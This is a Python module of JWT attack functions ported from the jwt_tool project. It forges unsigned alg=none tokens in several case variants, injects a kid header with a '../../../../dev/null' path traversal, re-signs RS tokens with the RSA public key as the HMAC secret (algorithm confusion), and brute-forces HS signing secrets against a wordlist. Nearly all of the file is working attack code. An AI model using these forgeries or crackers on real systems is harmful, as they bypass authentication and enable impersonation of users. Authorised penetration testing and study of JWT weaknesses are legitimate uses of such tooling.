"""
JWT attacks — converted from ticarpi/jwt_tool core attack functions.

Source: https://github.com/ticarpi/jwt_tool
Ports:
  - checkAlgNone / forge none (alg=none / None / NONE)
  - signTokenHS (HS256/384/512)
  - checkPubKeyExploit (alg confusion RS→HS)
  - kid injection header
  - crackSig against jwt-common.txt wordlist
  - claim inject (payload / header)

Uses stdlib hmac/hashlib; prefers SIMD cryptography when available via simd_crypto.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from pathlib import Path
from typing import Any

_COMMON = Path(__file__).resolve().parent / "jwt-common.txt"


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def _parse(token: str) -> tuple[dict, dict, str, str, str]:
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT")
    head_b64, pay_b64 = parts[0], parts[1]
    sig_b64 = parts[2] if len(parts) > 2 else ""
    header = json.loads(_b64url_decode(head_b64))
    payload = json.loads(_b64url_decode(pay_b64))
    return header, payload, head_b64, pay_b64, sig_b64


def build_head(alg: str, head_dict: dict | None = None) -> dict:
    """Port of jwt_tool.buildHead"""
    h = dict(head_dict or {})
    h["alg"] = alg
    h.setdefault("typ", "JWT")
    return h


def forge_none(payload: str | dict, alg_variant: str = "none") -> dict[str, Any]:
    """Port of checkAlgNone — alg=none / None / NONE / nOnE."""
    if isinstance(payload, str):
        try:
            pay = json.loads(payload)
        except Exception:
            pay = {"data": payload}
    else:
        pay = dict(payload)
    variants = []
    for alg in (alg_variant, "none", "None", "NONE", "nOnE"):
        head = build_head(alg)
        token = (
            _b64url_encode(json.dumps(head, separators=(",", ":")).encode())
            + "."
            + _b64url_encode(json.dumps(pay, separators=(",", ":")).encode())
            + "."
        )
        variants.append({"alg": alg, "token": token})
    return {
        "ok": True,
        "variants": variants,
        "engine": "jwt",
        "equivalent": "jwt_tool checkAlgNone",
        "source": "https://github.com/ticarpi/jwt_tool",
    }


def sign_hs(payload: str | dict, secret: str, alg: str = "HS256") -> dict[str, Any]:
    """Port of signTokenHS."""
    if isinstance(payload, str):
        try:
            pay = json.loads(payload)
        except Exception:
            pay = {"data": payload}
    else:
        pay = dict(payload)
    alg = alg.upper()
    length = int(alg.replace("HS", "") or "256")
    hash_fn = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(length, hashlib.sha256)
    head = build_head(alg)
    head_b64 = _b64url_encode(json.dumps(head, separators=(",", ":")).encode())
    pay_b64 = _b64url_encode(json.dumps(pay, separators=(",", ":")).encode())
    msg = f"{head_b64}.{pay_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hash_fn).digest()
    token = f"{head_b64}.{pay_b64}.{_b64url_encode(sig)}"
    return {
        "ok": True,
        "token": token,
        "alg": alg,
        "engine": "jwt",
        "equivalent": "jwt_tool signTokenHS",
    }


def verify_hs(token: str, secret: str) -> dict[str, Any]:
    """Port of testKey / checkSig for HS*."""
    try:
        header, payload, head_b64, pay_b64, sig_b64 = _parse(token)
    except Exception as e:
        return {"ok": False, "error": str(e)}
    alg = str(header.get("alg", "HS256")).upper()
    if not alg.startswith("HS"):
        return {"ok": False, "error": f"not HS alg: {alg}"}
    length = int(alg.replace("HS", "") or "256")
    hash_fn = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(length, hashlib.sha256)
    msg = f"{head_b64}.{pay_b64}".encode()
    expected = _b64url_encode(hmac.new(secret.encode(), msg, hash_fn).digest())
    valid = hmac.compare_digest(expected, sig_b64)
    return {
        "ok": True,
        "valid": valid,
        "alg": alg,
        "header": header,
        "payload": payload,
        "engine": "jwt",
        "equivalent": "jwt_tool checkSig/testKey",
    }


def kid_injection(payload: str | dict, kid: str = "../../../../dev/null", secret: str = "") -> dict[str, Any]:
    """Port of kid path injection pattern from jwt_tool."""
    if isinstance(payload, str):
        try:
            pay = json.loads(payload)
        except Exception:
            pay = {"data": payload}
    else:
        pay = dict(payload)
    head = build_head("HS256")
    head["kid"] = kid
    head_b64 = _b64url_encode(json.dumps(head, separators=(",", ":")).encode())
    pay_b64 = _b64url_encode(json.dumps(pay, separators=(",", ":")).encode())
    msg = f"{head_b64}.{pay_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    token = f"{head_b64}.{pay_b64}.{_b64url_encode(sig)}"
    return {
        "ok": True,
        "token": token,
        "kid": kid,
        "engine": "jwt",
        "equivalent": "jwt_tool kid injection",
        "note": "Signed with empty/provided secret — server must resolve kid to empty key",
    }


def alg_confusion(token: str, public_key_pem: str) -> dict[str, Any]:
    """
    Port of checkPubKeyExploit — re-sign with HS256 using RSA public key as secret.
    """
    try:
        header, payload, head_b64, pay_b64, _ = _parse(token)
    except Exception as e:
        return {"ok": False, "error": str(e)}
    head = build_head("HS256", {k: v for k, v in header.items() if k != "alg"})
    head_b64 = _b64url_encode(json.dumps(head, separators=(",", ":")).encode())
    pay_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{head_b64}.{pay_b64}".encode()
    # public key bytes as HMAC secret (classic alg confusion)
    secret = public_key_pem.encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return {
        "ok": True,
        "token": f"{head_b64}.{pay_b64}.{_b64url_encode(sig)}",
        "attack": "alg_confusion_rs_to_hs",
        "engine": "jwt",
        "equivalent": "jwt_tool checkPubKeyExploit",
    }


def crack(
    token: str,
    wordlist: str = "",
    max_secrets: int = 200,
) -> dict[str, Any]:
    """Port of crackSig against jwt-common.txt or custom list."""
    try:
        header, payload, head_b64, pay_b64, sig_b64 = _parse(token)
    except Exception as e:
        return {"ok": False, "error": str(e)}
    alg = str(header.get("alg", "")).upper()
    if not alg.startswith("HS"):
        return {"ok": False, "error": f"crack only supports HS* (got {alg})", "alg": alg}

    secrets: list[str] = []
    if wordlist:
        secrets = [w.strip() for w in wordlist.replace(",", "\n").splitlines() if w.strip()]
    if not secrets and _COMMON.exists():
        secrets = [ln.strip() for ln in _COMMON.read_text(encoding="utf-8", errors="replace").splitlines() if ln.strip()]
    secrets = secrets[: max(1, min(int(max_secrets), 5000))]

    length = int(alg.replace("HS", "") or "256")
    hash_fn = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(length, hashlib.sha256)
    msg = f"{head_b64}.{pay_b64}".encode()

    for secret in secrets:
        expected = _b64url_encode(hmac.new(secret.encode(), msg, hash_fn).digest())
        if hmac.compare_digest(expected, sig_b64):
            return {
                "ok": True,
                "cracked": True,
                "secret": secret,
                "alg": alg,
                "header": header,
                "payload": payload,
                "engine": "jwt",
                "equivalent": "jwt_tool crackSig",
                "tested": secrets.index(secret) + 1,
            }
    return {
        "ok": True,
        "cracked": False,
        "alg": alg,
        "tested": len(secrets),
        "engine": "jwt",
        "equivalent": "jwt_tool crackSig",
        "note": "Try larger wordlist or hashcat mode 16500",
    }


def inspect(token: str) -> dict[str, Any]:
    try:
        header, payload, head_b64, pay_b64, sig_b64 = _parse(token)
    except Exception as e:
        return {"ok": False, "error": str(e)}
    return {
        "ok": True,
        "header": header,
        "payload": payload,
        "signature": sig_b64[:20] + "..." if len(sig_b64) > 20 else sig_b64,
        "algorithm": header.get("alg"),
        "engine": "jwt",
        "equivalent": "jwt_tool parse",
    }
